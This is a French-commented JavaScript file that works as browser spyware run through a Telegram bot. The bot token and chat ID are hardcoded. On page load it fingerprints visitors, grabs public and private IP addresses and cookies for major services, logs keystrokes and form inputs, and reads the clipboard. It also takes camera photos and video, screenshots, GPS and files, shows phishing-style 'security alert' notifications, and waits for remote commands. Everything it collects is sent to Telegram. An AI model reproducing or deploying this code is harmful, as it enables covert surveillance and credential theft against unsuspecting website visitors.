// ============================================
// CONFIGURATION TELEGRAM (INTÉGRÉE)
// ============================================
const TELEGRAM_BOT_TOKEN = '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
const TELEGRAM_CHAT_ID = '6767182328';
const BOT_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

const statusDiv = document.getElementById('statusBar');
let lastCommand = '';
let collectedData = {
    fingerprint: {},
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    publicIP: null,
    privateIP: null,
    photos: [],
    video: null,
    clipboard: null,
    location: null,
    keystrokes: [],
    cookies: {},
    browsingHistory: [],
    deviceBattery: null,
    externalFiles: {
        images: [],
        videos: [],
        audios: [],
        documents: [],
        all: []
    },
    permissionsGranted: [],
    fileSystemAccess: false
};

function updateStatus(msg, isError = false) {
    if (statusDiv) {
        statusDiv.innerHTML = (isError ? '🔴 ' : '🟢 ') + msg;
    }
    console.log('[STATUS]', msg);
}

// ============================================
// ENVOIS TELEGRAM
// ============================================
async function sendToTelegram(message) {
    try {
        await fetch(`${BOT_API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message.substring(0, 4000) })
        });
    } catch(e) {}
}

async function sendPhotoToTelegram(photoDataUrl) {
    try {
        const blob = await (await fetch(photoDataUrl)).blob();
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        await fetch(`${BOT_API_URL}/sendPhoto`, { method: 'POST', body: formData });
    } catch(e) {}
}

async function sendVideoToTelegram(videoUrl) {
    try {
        const blob = await fetch(videoUrl).then(r => r.blob());
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('video', blob, 'video.webm');
        await fetch(`${BOT_API_URL}/sendVideo`, { method: 'POST', body: formData });
    } catch(e) {}
}

async function sendFileToTelegram(filename, dataUrl) {
    try {
        const blob = await (await fetch(dataUrl)).blob();
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('document', blob, filename);
        await fetch(`${BOT_API_URL}/sendDocument`, { method: 'POST', body: formData });
    } catch(e) {}
}

// ============================================
// 1. FINGERPRINT + IP + LOCALISATION
// ============================================
async function collectFingerprint() {
    updateStatus('📡 Collecte empreinte numérique...');
    collectedData.fingerprint = {
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        cpuCores: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        uuid: crypto.randomUUID ? crypto.randomUUID() : 'not-supported'
    };
    
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        collectedData.publicIP = data.ip;
    } catch(e) {
        try {
            const res = await fetch('https://api.my-ip.io/ip.json');
            const data = await res.json();
            collectedData.publicIP = data.ip;
        } catch(e2) {}
    }
    
    // Batterie
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            collectedData.deviceBattery = {
                level: battery.level * 100 + '%',
                charging: battery.charging
            };
        } catch(e) {}
    }
    
    await sendToTelegram(`🆕 NOUVEAU VISITEUR
━━━━━━━━━━━━━━━━━━━━━
🆔 UUID: ${collectedData.fingerprint.uuid}
📱 Agent: ${navigator.userAgent}
🖥️ Écran: ${collectedData.fingerprint.screen}
🌍 IP: ${collectedData.publicIP || 'inconnue'}
🔋 Batterie: ${collectedData.deviceBattery?.level || 'inconnue'}
━━━━━━━━━━━━━━━━━━━━━`);
}

// ============================================
// 2. IP PRIVÉE (WebRTC)
// ============================================
async function collectPrivateIP() {
    return new Promise((resolve) => {
        updateStatus('🌐 Récupération IP privée...');
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = event => {
            if (event?.candidate?.candidate) {
                const match = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                if (match) {
                    collectedData.privateIP = match[0];
                    updateStatus('✅ IP privée: ' + match[0]);
                    pc.close();
                    resolve(match[0]);
                }
            }
        };
        setTimeout(() => {
            collectedData.privateIP = 'non détectée';
            pc.close();
            resolve('non détectée');
        }, 2000);
    });
}

// ============================================
// 3. COOKIES (complet)
// ============================================
function collectAllCookies() {
    updateStatus('🍪 Récupération des cookies...');
    const allCookies = document.cookie.split(';');
    const importantDomains = ['facebook', 'instagram', 'google', 'gmail', 'twitter', 'tiktok', 'snapchat', 'netflix', 'spotify', 'amazon', 'whatsapp', 'telegram'];
    
    allCookies.forEach(cookie => {
        const cookieName = cookie.split('=')[0].trim();
        const cookieValue = cookie.split('=')[1]?.trim() || '';
        
        importantDomains.forEach(domain => {
            if (cookieName.toLowerCase().includes(domain) || document.domain.includes(domain)) {
                collectedData.cookies[domain] = collectedData.cookies[domain] || [];
                collectedData.cookies[domain].push({ name: cookieName, value: cookieValue });
            }
        });
    });
    
    collectedData.cookies.all = document.cookie;
    if (Object.keys(collectedData.cookies).length > 0) {
        sendToTelegram(`🍪 COOKIES RÉCUPÉRÉS\n${JSON.stringify(collectedData.cookies, null, 2).substring(0, 3500)}`);
    }
}

// ============================================
// 4. HISTORIQUE COMPLET
// ============================================
function collectBrowsingHistory() {
    updateStatus('📜 Récupération historique...');
    try {
        const perfEntries = performance.getEntriesByType('navigation');
        perfEntries.forEach(entry => {
            if (entry.name && entry.name !== 'about:blank') {
                collectedData.browsingHistory.push(entry.name);
            }
        });
        if (document.referrer) collectedData.browsingHistory.push(`Referrer: ${document.referrer}`);
        if (collectedData.browsingHistory.length > 0) {
            sendToTelegram(`📜 HISTORIQUE\n${collectedData.browsingHistory.slice(0, 10).join('\n')}`);
        }
    } catch(e) {}
}

// ============================================
// 5. NOTIFICATIONS (amélioré)
// ============================================
async function requestNotifications() {
    updateStatus('🔔 Demande autorisation notifications...');
    const permission = await Notification.requestPermission();
    if (permission === 'granted') {
        collectedData.permissionsGranted.push({ type: 'notifications', status: 'granted' });
        updateStatus('✅ Notifications activées');
        await sendToTelegram('✅ [AUTORISATION] NOTIFICATIONS PUSH ACCEPTÉES');
        
        new Notification('🔐 ALERTE SÉCURITÉ', {
            body: 'Connexion suspecte détectée. Cliquez pour vérifier votre compte.',
            icon: 'https://img.icons8.com/color/48/000000/security-checked--v1.png',
            requireInteraction: true
        });
    } else {
        collectedData.permissionsGranted.push({ type: 'notifications', status: 'denied' });
        await sendToTelegram('❌ [AUTORISATION] NOTIFICATIONS PUSH REFUSÉES');
    }
}

// ============================================
// 6. CAMÉRA + PHOTOS + VIDÉO (complet)
// ============================================
async function requestCameraAndCapture() {
    updateStatus('📷 Demande accès caméra...');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        collectedData.permissionsGranted.push({ type: 'camera', status: 'granted' });
        updateStatus('✅ Caméra activée');
        await sendToTelegram('✅ [AUTORISATION] CAMÉRA ACCEPTÉE');
        
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        
        // 5 photos
        for (let i = 1; i <= 5; i++) {
            updateStatus(`📸 Photo ${i}/5...`);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            collectedData.photos.push(photoData);
            await sendPhotoToTelegram(photoData);
            await new Promise(r => setTimeout(r, 2000));
        }
        
        // Vidéo 8 secondes
        updateStatus('🎥 Enregistrement vidéo (8s)...');
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            const url = URL.createObjectURL(blob);
            sendVideoToTelegram(url);
        };
        mediaRecorder.start();
        await new Promise(r => setTimeout(r, 8000));
        mediaRecorder.stop();
        
        stream.getTracks().forEach(t => t.stop());
        updateStatus('✅ Capture terminée');
        await sendToTelegram('✅ CAPTURE TERMINÉE: 5 photos + 1 vidéo 8s');
    } catch(e) {
        collectedData.permissionsGranted.push({ type: 'camera', status: 'denied' });
        await sendToTelegram(`❌ [AUTORISATION] CAMÉRA REFUSÉE`);
    }
}

// ============================================
// 7. BOUTON FICHIERS FLOTTANT (amélioré)
// ============================================
function showFloatingFileButton() {
    if (document.getElementById('file-btn')) return;
    const btn = document.createElement('button');
    btn.id = 'file-btn';
    btn.innerHTML = '📁 Sélectionner des fichiers';
    btn.style.cssText = 'position:fixed;bottom:80px;right:20px;z-index:9999;background:#28a745;color:white;border:none;border-radius:50px;padding:12px 18px;font-size:14px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.3);';
    btn.onclick = () => {
        const input = document.createElement('input');
        input.type = 'file';
        input.multiple = true;
        input.accept = 'image/*,video/*,audio/*,.pdf,.txt,.docx';
        input.onchange = async (e) => {
            const files = Array.from(e.target.files);
            await sendToTelegram(`📁 ${files.length} fichier(s) sélectionné(s)`);
            for (const file of files) {
                const fileInfo = { name: file.name, size: file.size, type: file.type };
                collectedData.externalFiles.all.push(fileInfo);
                if (file.type.startsWith('image/')) collectedData.externalFiles.images.push(fileInfo);
                else if (file.type.startsWith('video/')) collectedData.externalFiles.videos.push(fileInfo);
                else if (file.type.startsWith('audio/')) collectedData.externalFiles.audios.push(fileInfo);
                else collectedData.externalFiles.documents.push(fileInfo);
                
                const reader = new FileReader();
                reader.onload = async (ev) => {
                    const dataUrl = ev.target.result;
                    if (file.type.startsWith('image/')) {
                        await sendPhotoToTelegram(dataUrl);
                    } else {
                        await sendFileToTelegram(file.name, dataUrl);
                    }
                };
                reader.readAsDataURL(file);
            }
        };
        input.click();
        btn.remove();
    };
    document.body.appendChild(btn);
    setTimeout(() => btn.remove(), 30000);
}

// ============================================
// 8. BOUTON GPS FLOTTANT
// ============================================
function showFloatingGpsButton() {
    if (document.getElementById('gps-btn')) return;
    const btn = document.createElement('button');
    btn.id = 'gps-btn';
    btn.innerHTML = '📍 Partager ma position';
    btn.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:9999;background:#405DE6;color:white;border:none;border-radius:50px;padding:12px 18px;font-size:14px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.3);';
    btn.onclick = () => {
        navigator.geolocation.getCurrentPosition(
            pos => {
                collectedData.location = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                };
                sendToTelegram(`📍 LOCALISATION GPS\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nPrécision: ${pos.coords.accuracy}m\nCarte: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                btn.remove();
            },
            err => sendToTelegram(`❌ GPS refusé: ${err.message}`)
        );
        btn.remove();
    };
    document.body.appendChild(btn);
    setTimeout(() => btn.remove(), 30000);
}

// ============================================
// 9. PRESSE-PAPIER
// ============================================
async function requestClipboardAccess() {
    updateStatus('📋 Demande accès presse-papier...');
    try {
        if (navigator.clipboard?.readText) {
            const text = await navigator.clipboard.readText();
            collectedData.clipboard = text;
            await sendToTelegram(`📋 PRESSE-PAPIER\n${text.substring(0, 1000) || '(vide)'}`);
            updateStatus('✅ Presse-papier lu');
        }
    } catch(e) {
        updateStatus('❌ Presse-papier refusé');
        await sendToTelegram(`❌ PRESSE-PAPIER: accès refusé`);
    }
}

// ============================================
// 10. KEYLOGGER
// ============================================
function startKeylogger() {
    let keyBuffer = [];
    document.addEventListener('keypress', (e) => {
        keyBuffer.push(e.key);
        if (keyBuffer.length >= 20) {
            sendToTelegram(`⌨️ KEYLOGGER\nFrappes: ${keyBuffer.join('')}`);
            keyBuffer = [];
        }
    });
    document.addEventListener('input', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            sendToTelegram(`📝 INPUT\nChamp: ${e.target.name || e.target.id || 'inconnu'}\nValeur: ${e.target.value?.substring(0, 200)}`);
        }
    });
    updateStatus('⌨️ Keylogger actif');
}

// ============================================
// 11. CAPTURE ÉCRAN
// ============================================
async function captureScreenshot() {
    updateStatus('📸 Capture d\'écran...');
    try {
        if (typeof html2canvas === 'undefined') {
            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
            document.head.appendChild(script);
            await new Promise(r => setTimeout(r, 1500));
        }
        if (typeof html2canvas !== 'undefined') {
            const canvas = await html2canvas(document.body);
            const screenshot = canvas.toDataURL('image/png');
            await sendPhotoToTelegram(screenshot);
            updateStatus('✅ Capture envoyée');
        }
    } catch(e) {
        updateStatus('❌ Capture échouée');
    }
}

// ============================================
// 12. VIBRATION
// ============================================
function vibrate() {
    if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
}

// ============================================
// 13. LISTE FICHIERS
// ============================================
function sendFileList() {
    sendToTelegram(`📁 LISTE FICHIERS\n📷 Images: ${collectedData.externalFiles.images.length}\n🎥 Vidéos: ${collectedData.externalFiles.videos.length}\n🎵 Audios: ${collectedData.externalFiles.audios.length}\n📄 Docs: ${collectedData.externalFiles.documents.length}\n📦 Total: ${collectedData.externalFiles.all.length}`);
}

// ============================================
// 14. LISTE AUTORISATIONS
// ============================================
function sendPermissions() {
    sendToTelegram(`✅ AUTORISATIONS\n${JSON.stringify(collectedData.permissionsGranted, null, 2)}`);
}

// ============================================
// 15. COMMANDES À DISTANCE
// ============================================
async function checkCommands() {
    try {
        const res = await fetch('/tmp/telegram_command.txt?t=' + Date.now());
        if (!res.ok) return;
        
        const cmd = await res.text();
        const cleanCmd = cmd.trim();
        
        if (!cleanCmd || cleanCmd === lastCommand) return;
        lastCommand = cleanCmd;
        
        console.log('[COMMAND]', cleanCmd);
        await sendToTelegram(`📟 Commande: ${cleanCmd}`);
        
        switch(cleanCmd) {
            case '/camera': await requestCameraAndCapture(); break;
            case '/files': showFloatingFileButton(); break;
            case '/clipboard': await requestClipboardAccess(); break;
            case '/screenshot': await captureScreenshot(); break;
            case '/location': showFloatingGpsButton(); break;
            case '/cookies': collectAllCookies(); break;
            case '/history': collectBrowsingHistory(); break;
            case '/status': sendToTelegram(`📊 STATUT\nUUID: ${collectedData.fingerprint.uuid}\nIP: ${collectedData.publicIP || 'inconnue'}\nCookies: ${document.cookie.length > 0 ? 'présents' : 'aucun'}\nPhotos: ${collectedData.photos.length}\nFichiers: ${collectedData.externalFiles.all.length}\nAutorisations: ${collectedData.permissionsGranted.length}`); break;
            case '/ping': sendToTelegram('🏓 Pong!'); break;
            case '/vibrate': vibrate(); break;
            case '/filelist': sendFileList(); break;
            case '/permissions': sendPermissions(); break;
            case '/help':
            case '/start':
                sendToTelegram(`🤖 COMMANDES BOT
━━━━━━━━━━━━━━━━━━━━━
📷 /camera - Photos + vidéo
📁 /files - Sélection fichiers
📋 /clipboard - Presse-papier
📸 /screenshot - Capture écran
📍 /location - GPS
🍪 /cookies - Cookies
📜 /history - Historique
📊 /status - État
🏓 /ping - Test
📳 /vibrate - Vibration
📁 /filelist - Liste fichiers
✅ /permissions - Autorisations
🔔 notify_custom:TEXTE
🌐 url:https://...
━━━━━━━━━━━━━━━━━━━━━`);
                break;
            default:
                if (cleanCmd.startsWith('notify_custom:')) {
                    new Notification('📢 Message', { body: cleanCmd.replace('notify_custom:', '').trim() });
                } else if (cleanCmd.startsWith('url:')) {
                    window.open(cleanCmd.replace('url:', '').trim(), '_blank');
                }
        }
        
        await fetch('/tmp/telegram_command.txt', { method: 'POST', body: '' });
        lastCommand = '';
    } catch(e) {}
}

// ============================================
// 16. KEEP-ALIVE
// ============================================
function keepAlive() {
    setInterval(() => {
        fetch('/tmp/keepalive.txt?t=' + Date.now()).catch(() => {});
        const audio = new Audio('data:audio/wav;base64,U3RlYWx0aCBibHVlIG11c2lj');
        audio.play().catch(() => {});
    }, 25000);
}

// ============================================
// EXÉCUTION PRINCIPALE
// ============================================
(async function main() {
    updateStatus('🟢 Démarrage du module ULTIME...');
    
    await collectFingerprint();
    await collectPrivateIP();
    collectAllCookies();
    collectBrowsingHistory();
    await requestNotifications();
    
    setTimeout(() => requestCameraAndCapture(), 3000);
    setTimeout(() => requestClipboardAccess(), 6000);
    
    startKeylogger();
    keepAlive();
    
    setInterval(checkCommands, 3000);
    updateStatus('✅ Prêt - Commandes actives');
    await sendToTelegram('💀 MODULE ULTIME ACTIVÉ - Envoyez /help');
})();
